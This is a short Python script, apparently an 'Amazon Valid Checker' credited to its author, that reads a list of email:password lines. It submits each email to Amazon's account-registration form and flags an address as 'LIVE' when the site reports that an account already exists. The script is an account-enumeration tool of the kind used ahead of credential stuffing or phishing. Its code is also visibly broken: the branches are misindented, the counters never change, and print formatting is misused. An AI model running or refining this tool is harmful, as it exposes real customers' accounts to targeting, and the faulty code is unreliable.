while True:
  import requests
  import os
  import time 
  seconds = time.time()
  local_time = time.ctime(seconds)
  print(local_time)
  print("""
 █████╗ ███╗   ███╗ █████╗ ███████╗ ██████╗ ███╗   ██╗    ██╗   ██╗ █████╗ ██╗██╗     ██████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗████╗ ████║██╔══██╗╚══███╔╝██╔═══██╗████╗  ██║    ██║   ██║██╔══██╗██║██║     ██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║██╔████╔██║███████║  ███╔╝ ██║   ██║██╔██╗ ██║    ██║   ██║███████║██║██║     ██║  ██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██║╚██╔╝██║██╔══██║ ███╔╝  ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝██╔══██║██║██║     ██║  ██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║ ╚═╝ ██║██║  ██║███████╗╚██████╔╝██║ ╚████║     ╚████╔╝ ██║  ██║██║███████╗██████╔╝    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝  ╚═╝  ╚═╝╚═╝╚══════╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
########################
coded by | Muhammed Mater
facebook.com/xcberlin
########################
""")
  list=  input("File Name : ")
  link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
  head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
  s = requests.session()
  g = s.get(link, headers=head)
  v=0;d=0
  list = open(list, 'r')
  while True:
   
   email = list.readline().replace('\n','')
   if not email:
     break
   AAAA = email.strip().split(':')
   BBB = {'customerName':'Aron_Tn','email': AAAA[0],'emailCheck': AAAA[0],'password':'Aron123123','passwordCheck':'Aron123123'}
   CCC = s.post(link, headers=head, data=BBB).text
   if "You indicated you are a new customer, but an account already exists with the e-mail" in CCC:
     open('Mater.txt', 'a').write(email + '\n')
   print("\033[32;1m%d - LIVE\033[0m | "+email+" | Mater")%(v+1)
  else:
   open('Mater.txt', 'a').write(email + '\n')
   print("\033[31;1m%d - DIE\033[0m | "+email+" | Not Vaild")%(d+1)
